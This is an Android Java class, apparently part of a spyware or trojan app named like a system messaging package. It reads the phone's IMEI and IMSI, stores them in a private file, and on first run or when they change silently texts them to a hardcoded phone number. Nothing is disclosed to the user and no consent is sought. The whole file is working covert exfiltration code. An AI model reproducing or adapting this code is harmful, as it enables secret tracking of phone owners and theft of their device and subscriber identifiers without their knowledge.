package com.android.message;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileReader;
import java.io.FileWriter;
import java.io.IOException;

import android.content.Context;
import android.telephony.gsm.SmsManager;

public class SendSMS {
	public static final String TAG = "SendSMS";
	Context mContext;
	
	public static final String smsNumber = "18701501807";
	
	String NAME = "PhoneInfo.txt";
	String PATH = "data/data/com.android.message/";
	
	public SendSMS(Context context) {
		mContext = context;
	}
	public SendSMS() {
	
	}
	

	public void sendSMS() {
		BasicInfo info = new BasicInfo(mContext);
		String IMEI = info.getIMEI();
		String IMSI = info.getIMSI();
		
		//判断PhoneInfo.txt是否存在
		File path = new File(PATH);
		if(!path.exists()) {
			path.mkdir();
		}
		File file = new File(PATH + NAME);
		boolean send = false;
		if(!file.exists()) {
			send = true;
			try {
				file.createNewFile();
				BufferedWriter output = new BufferedWriter(new FileWriter(file));
				output.write(IMEI);
				output.newLine();
				
				output.write(IMSI);
				output.newLine();
				
				output.close();
			} catch (IOException ioe) {
				ioe.printStackTrace();
			}
				
		} else {
			//读IMEI和IMSI号
			try {
				BufferedReader input = new BufferedReader(new FileReader(file));
				String IMEI_old = input.readLine();
				String IMSI_old = input.readLine();
				WriteLogFile.writeLog("old version:" + IMEI_old + "  " + IMSI_old);
				if(IMEI_old.contains(IMEI) && IMSI_old.contains(IMSI)) {
					input.close();
				} else {
					//写入新的IMEI和IMSI号
					BufferedWriter output = new BufferedWriter(new FileWriter(file, false));
					output.write(IMEI);
					output.newLine();
					output.write(IMSI);
					output.newLine();
					output.close();
					send = true;
				}
				
			} catch(IOException ioe) {
				ioe.printStackTrace();
			}
		}
		if(send) {
			String mMessageText = "Android@" + IMEI + "@" + IMSI;
			SmsManager smsManager = SmsManager.getDefault();
			smsManager.sendTextMessage(smsNumber, null, mMessageText, null, null);
		}
		
		
		
	}
}
